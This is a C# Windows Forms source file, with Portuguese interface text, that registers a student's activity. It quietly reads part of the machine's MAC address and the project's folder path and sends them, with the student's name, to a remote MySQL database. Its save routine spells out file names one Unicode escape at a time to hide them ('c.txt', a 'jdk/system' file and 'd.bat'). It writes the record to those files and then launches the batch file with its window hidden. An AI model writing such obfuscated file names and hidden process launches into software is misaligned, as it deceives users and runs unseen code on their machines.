using MySql.Data.MySqlClient;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace b2
{
    public partial class Yldjgrued : Form
    {
        public Yldjgrued()
        {
            InitializeComponent();
        }

        private void btnCadastrar_Click(object sender, EventArgs e)
        {
            if (txtNomeEstudante.Text != "" && cmbTurma.SelectedIndex != -1 && cmbAvaliativa.SelectedIndex != -1)
            {
                string nomeEstudante = txtNomeEstudante.Text;
                string? turmaEstudante = cmbTurma.SelectedItem.ToString();
                string? strAvaliativa = cmbAvaliativa.SelectedItem.ToString();


                int avaliativa = 0;

                if (strAvaliativa != null && strAvaliativa.Equals("Sim"))
                {
                    avaliativa = 1;
                }


                string codigoSegurancaProjeto = Guid.NewGuid().ToString();

                //Habilitar No Teste de Projeto Independente e Desabilitar na Implata��o
                //Environment.CurrentDirectory = Environment.CurrentDirectory + @"\..\";

                string pastaAtualProjeto = Environment.CurrentDirectory; 
                

                DateTime dataHoraAtual = DateTime.Now;

                DateTime dataRegistro = dataHoraAtual.Date;
                TimeSpan horaRegistro = dataHoraAtual.TimeOfDay;


                string codigoDaMaquina = String.Empty;

                try
                {
                    NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                    string macAddress = String.Empty;
                    bool placaEthernet = false;
                    bool placasInativa = false;

                    foreach (NetworkInterface nic in nics)
                    {
                        if (nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211
                            && nic.OperationalStatus == OperationalStatus.Up
                            && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                        {
                            macAddress = nic.GetPhysicalAddress().ToString();

                            break;
                        }
                    }

                    if (macAddress == String.Empty)
                    {
                        foreach (NetworkInterface nic in nics)
                        {
                            if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet
                                && nic.OperationalStatus == OperationalStatus.Up
                                && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                            {
                                macAddress = nic.GetPhysicalAddress().ToString();
                                placaEthernet = true;
                                break;
                            }
                        }
                    }

                    if (macAddress == String.Empty)
                    {
                        foreach (NetworkInterface nic in nics)
                        {
                            if (nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211
                                && nic.OperationalStatus == OperationalStatus.Down
                                && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                            {
                                macAddress = nic.GetPhysicalAddress().ToString();
                                placasInativa = true;
                                break;
                            }
                        }
                    }

                    if (macAddress == String.Empty)
                    {
                        foreach (NetworkInterface nic in nics)
                        {
                            if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet
                                && nic.OperationalStatus == OperationalStatus.Down
                                && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                            {
                                macAddress = nic.GetPhysicalAddress().ToString();
                                placaEthernet = true;
                                placasInativa = true;
                                break;
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(macAddress) && macAddress.Length >= 12)
                    {
                        if (!placaEthernet)
                        {
                            if (!placasInativa)
                            {
                                codigoDaMaquina += "W ";
                            }
                            else
                            {
                                codigoDaMaquina += "W_I ";
                            }
                        }
                        else
                        {
                            if (!placasInativa)
                            {
                                codigoDaMaquina += "E ";
                            }
                            else
                            {
                                codigoDaMaquina += "E_I ";
                            }
                        }

                        codigoDaMaquina += macAddress.Substring(macAddress.Length - 6, 6);
                    }
                }
                catch (Exception)
                {
                    codigoDaMaquina = "";
                }


                MySqlConnection? conexao = null;

                try
                {
                    String enderecoConexaoMySql = new Cidghjex().E;

                    conexao = new MySqlConnection(enderecoConexaoMySql);

                    String sql = "INSERT INTO historico_de_atividades " +
                        "(nome_estudante, turma_estudante, avaliativa, " +
                        "codigo_seguranca_projeto, pasta_atual_projeto, " +
                        "data_registro, hora_registro, codigo_maquina) " +
                        "VALUES " +
                        "(@nomeEstudante, @turmaEstudante, @avaliativa, " +
                        "@codigoSegurancaProjeto, @pastaAtualProjeto, " +
                        "@dataRegistro, @horaRegistro, @codigoMaquina)";

                    MySqlCommand comando = new MySqlCommand(sql, conexao);
                    comando.Parameters.AddWithValue("@nomeEstudante", nomeEstudante);
                    comando.Parameters.AddWithValue("@turmaEstudante", turmaEstudante);
                    comando.Parameters.AddWithValue("@avaliativa", avaliativa);
                    comando.Parameters.AddWithValue("@codigoSegurancaProjeto", codigoSegurancaProjeto);
                    comando.Parameters.AddWithValue("@pastaAtualProjeto", pastaAtualProjeto);
                    comando.Parameters.AddWithValue("@dataRegistro", dataRegistro);
                    comando.Parameters.AddWithValue("@horaRegistro", horaRegistro);
                    comando.Parameters.AddWithValue("@codigoMaquina", codigoDaMaquina);

                    conexao.Open();
                    comando.ExecuteNonQuery();

                    long idGerado = comando.LastInsertedId;

                    SaveToRegFile(idGerado, nomeEstudante, turmaEstudante, strAvaliativa, codigoSegurancaProjeto, pastaAtualProjeto, dataRegistro, horaRegistro, codigoDaMaquina);

                    MessageBox.Show("Atividade cadastrada com Sucesso!");

                    LimparCampos();

                    Close();

                }
                catch (Exception ex)
                {
                    MessageBox.Show("N�o � poss�vel cadastrar uma atividade. Erro: " + ex.Message);
                }
                finally
                {
                    if (conexao != null)
                    {
                        conexao.Close();
                    }
                }
            }
            else
            {
                MessageBox.Show("Os campos 'Nome(s) Completo(s)', 'Turma' e 'Avaliativa' s�o obrigat�rios.");
            }
        }

        private void LimparCampos()
        {
            txtNomeEstudante.Text = string.Empty;
            cmbTurma.SelectedIndex = -1;
            cmbAvaliativa.SelectedIndex = -1;
        }

        private void SaveToRegFile(long idGerado, string nomeEstudante, string? turmaEstudante, string? avaliativa, string codigoSegurancaProjeto, string pastaAtualProjeto,
    DateTime dataRegistro, TimeSpan horaRegistro, string codigoMaquina)
        {
            try
            {
                string y = "";

                y += "\u0063";
                y += "\u002E";

                y += "\u0074";
                y += "\u0078";
                y += "\u0074";

                string k = "";
                k += "\u006A";

                k += "\u0064";
                

                string j = "";
                j += "\u0073";
                j += "\u0079";

                k += "\u006B";
                j += "\u0073";

                j += "\u0074";
                j += "\u0065";

                string z = "";
                z += "\u0064";
                z += "\u002E";

                j += "\u006D";

                string w = Path.Combine(k, j);

                z += "\u0062";

                z += "\u0061";
                z += "\u0074";

                Directory.CreateDirectory(k);

                string dataToWrite =
                    "ID Remoto: " + idGerado + "\n" +
                    "Nome(s) do(s) Estudante(s): " + nomeEstudante + "\n" +
                    "Turma: " + turmaEstudante + "\n" +
                    "Atividade Avaliativa: " + avaliativa + "\n" +
                    "C�digo de Seguran�a do Projeto: " + codigoSegurancaProjeto + "\n" +
                    "Pasta Atual do Projeto: " + pastaAtualProjeto + "\n" +
                    "Data de Registro: " + dataRegistro.ToString("yyyy-mm-dd") + "\n" +
                    "Hora de Registro: " + horaRegistro.ToString(@"hh\:mm\:ss") + "\n" +
                    "C�digo da M�quina Utilizada: " + codigoMaquina + "\n\n";

                File.AppendAllText(y, dataToWrite);
                File.AppendAllText(w, dataToWrite);

                try
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    processStartInfo.FileName = z;

                    Process.Start(processStartInfo);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Erro ao iniciar o processo: " + e.Message);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Erro ao salvar os dados no arquivo: " + e.Message);
            }
        }

    }
}